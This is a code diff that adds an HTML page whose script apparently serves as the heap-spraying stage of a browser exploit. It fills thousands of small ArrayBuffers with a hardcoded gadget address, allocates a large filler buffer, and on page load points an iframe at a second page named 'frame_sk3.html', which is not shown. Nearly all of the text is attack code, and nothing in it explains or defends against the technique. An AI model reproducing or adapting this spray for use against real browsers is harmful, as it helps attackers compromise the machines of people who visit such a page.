@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<script>
+
+	//var obj= new ArrayBuffer(size); 
+	//var payload=  new Uint32Array(obj);
+
+function ob(size, gadget){
+
+	obj= new ArrayBuffer(size); 
+	payload=  new Uint32Array(obj);
+	payload[0]=gadget;
+	payload[1]=gadget;
+}
+
+function spray4(iter) {	
+	var x=0;
+	for(var i=0; i < iter; i++){
+		x = (i*2) % 366;
+		ob(0x8, 0x00e14e60);
+	}
+}
+spray4(9000);	
+
+var s=1*0x100000;
+var obj2= new ArrayBuffer(s); 
+var payload2=  new Uint32Array(obj2);
+for(var i=0; i<s/4; i++) payload2[i]=i;
+
+function go(){
+	var f=document.getElementById("frm");
+	f.src="frame_sk3.html";
+	
+}	
+</script>
+
+<body onload="go()">
+	<iframe id="frm" width="800" height="600" src=""></iframe>
+</body>
